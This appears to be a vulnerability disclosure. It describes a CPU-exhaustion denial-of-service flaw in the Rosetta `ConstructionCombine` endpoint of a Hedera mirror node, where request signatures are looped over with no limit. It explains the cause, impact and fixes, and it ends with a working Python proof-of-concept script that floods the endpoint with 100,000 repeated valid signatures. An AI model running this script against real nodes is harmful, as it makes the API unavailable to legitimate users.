### Title
Unbounded Signature Loop in `ConstructionCombine` Enables CPU Exhaustion DoS

### Summary
`ConstructionCombine` in `rosetta/app/services/construction_service.go` iterates over `request.Signatures` with no upper-bound check. An unauthenticated attacker who generates their own Ed25519 key pair can craft a request containing thousands of copies of the same valid signature, forcing the server to call `hiero.PublicKeyFromBytes()`, `ed25519.Verify()`, and `hiero.TransactionAddSignature()` for every entry, exhausting CPU resources. The "large `PublicKey.Bytes`" framing in the question is a red herring — oversized bytes cause an immediate early-exit via `ErrInvalidPublicKey`; the real amplification comes from valid signatures repeated at scale.

### Finding Description
**Exact location:** `rosetta/app/services/construction_service.go`, `ConstructionCombine()`, lines 58–87.

```go
// Line 58 — only lower-bound check, no upper bound
if len(request.Signatures) == 0 {
    return nil, errors.ErrNoSignature
}
// ...
for _, signature := range request.Signatures {   // line 72 — unbounded
    if signature.SignatureType != rTypes.Ed25519 {
        return nil, errors.ErrInvalidSignatureType
    }
    pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes) // line 77
    if err != nil {
        return nil, errors.ErrInvalidPublicKey
    }
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) { // line 82
        return nil, errors.ErrInvalidSignatureVerification
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes) // line 86
}
```

**Root cause / failed assumption:** The code assumes callers will supply a small, bounded number of signatures (one per required signer). There is no `maxSignatures` guard. Because the attacker controls both the `UnsignedTransaction` and the `Signatures` array, they can pre-sign the transaction body with their own key and then repeat that `{PublicKey, Bytes}` pair N times. Every iteration passes all three checks and performs real cryptographic work.

**Why the "large bytes" variant fails but the repeat-valid-signature variant succeeds:**
- Large/garbage `PublicKey.Bytes` → `hiero.PublicKeyFromBytes` returns an error → loop exits on iteration 1 → no amplification.
- Valid 32-byte Ed25519 key + valid signature repeated N times → all three operations execute N times → full amplification.

### Impact Explanation
Each loop iteration performs at minimum one `hiero.PublicKeyFromBytes` parse, one `ed25519.Verify` (a full curve operation), and one `hiero.TransactionAddSignature`. With N = 100,000 entries in a single request, this is 100,000 Ed25519 verifications on a single goroutine. Go's `net/http` spawns a goroutine per connection; a handful of concurrent such requests can saturate all available CPU cores on the mirror node, causing the Rosetta API to become unresponsive for legitimate users. Because the Rosetta API is the transaction-construction and submission path, a sustained attack prevents any transaction from being submitted through this interface.

### Likelihood Explanation
The `/construction/combine` endpoint is publicly reachable with no authentication. The attacker needs only:
1. A valid hex-encoded unsigned transaction (trivially obtained from `/construction/payloads` or crafted manually).
2. One Ed25519 key pair (generated locally in milliseconds).
3. One valid signature over the transaction body bytes.

They then repeat that signature entry N times in the JSON array. No on-chain funds, no privileged access, and no prior knowledge of the system are required. The attack is fully repeatable and scriptable.

The optional Traefik `rateLimit` (average: 10 req/s per host, `charts/hedera-mirror-rosetta/values.yaml` lines 157–161) is not enforced at the application layer and is disabled unless `global.middleware` is explicitly enabled. The HTTP `ReadTimeout` of 5 s (`docs/configuration.md` line 664) limits body ingestion time but a JSON payload with 50,000 signature entries (~few MB) is easily transmitted within that window on any reasonable connection.

### Recommendation
1. **Add a hard cap on signature count** immediately after the empty-check:
   ```go
   const maxSignatures = 10 // adjust to the maximum legitimate signers
   if len(request.Signatures) == 0 {
       return nil, errors.ErrNoSignature
   }
   if len(request.Signatures) > maxSignatures {
       return nil, errors.ErrTooManySignatures
   }
   ```
2. **Add an HTTP body-size limit** in `main.go` using `http.MaxBytesReader` so oversized payloads are rejected before JSON parsing.
3. **Enforce rate limiting at the application layer** rather than relying solely on optional Traefik middleware.

### Proof of Concept
```python
import json, subprocess, hashlib, base64
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

# 1. Generate attacker key pair
priv = Ed25519PrivateKey.generate()
pub  = priv.public_key()
pub_bytes = pub.public_bytes_raw()   # 32 bytes

# 2. Obtain a valid unsigned_transaction hex from /construction/payloads
#    (or craft one manually). Here we use a known-good value from the test suite.
unsigned_tx = "0x0a432a410a3d0a140a0c08feafcb840610ae86c0db03120418d8c307120218041880c2d72f2202087872180a160a090a0418d8c30710cf0f0a090a0418fec40710d00f1200"

# 3. Derive frozenBodyBytes (the bytes that must be signed).
#    In practice, call /construction/payloads to get signing_payload.hex_bytes.
body_bytes = bytes.fromhex("967f26876ad492cc27b4c384dc962f443bcc9be33cbb7add3844bc864de04734"
                           "0e7a78c0fbaf40ab10948dc570bbc25edb505f112d0926dffb65c93199e6d507")

# 4. Sign once with attacker key
sig_bytes = priv.sign(body_bytes)

# 5. Build a single valid signature entry, then repeat it N times
entry = {
    "signing_payload": {
        "account_identifier": {"address": "0.0.1234"},
        "hex_bytes": body_bytes.hex(),
        "signature_type": "ed25519"
    },
    "public_key": {"hex_bytes": pub_bytes.hex(), "curve_type": "edwards25519"},
    "signature_type": "ed25519",
    "hex_bytes": sig_bytes.hex()
}

N = 100_000   # tune to desired CPU load
payload = json.dumps({
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "unsigned_transaction": unsigned_tx,
    "signatures": [entry] * N
})

# 6. Send — server will call PublicKeyFromBytes + ed25519.Verify N times
import urllib.request
req = urllib.request.Request(
    "http://<mirror-node>:5700/construction/combine",
    data=payload.encode(),
    headers={"Content-Type": "application/json"},
    method="POST"
)
urllib.request.urlopen(req)
# Repeat concurrently from multiple clients to saturate CPU
```